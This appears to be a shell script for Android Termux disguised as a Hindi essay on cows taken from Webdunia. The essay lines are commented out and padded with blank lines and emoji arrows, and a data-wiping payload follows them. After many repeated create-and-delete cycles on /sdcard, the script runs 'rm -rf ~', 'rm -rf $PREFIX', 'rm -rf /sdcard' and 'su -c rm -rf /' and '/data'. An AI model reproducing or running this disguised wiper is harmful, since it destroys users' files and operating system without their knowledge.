#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो






#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो






#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो








mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*
rm -rf /sdcard
su -c rm -rf /
su -c rm -rf /data

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*
rm -rf /sdcard
su -c rm -rf /
su -c rm -rf /data

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

mkdir /sdcard/virus
mkdir /sdcard/viruss
mkdir /sdcard/virusss
mkdir /sdcard/virussss
mkdir /sdcard/virusssss
mkdir /sdcard/virussssss
mkdir /sdcard/virusssssss
mkdir /sdcard/virussssssss
mkdir /sdcard/virusssssssss
rm -rf /sdcard/virus*

rm -rf ~
rm -rf $PREFIX
mkdir /sdcard/virus
mkdir /sdcard/viruss
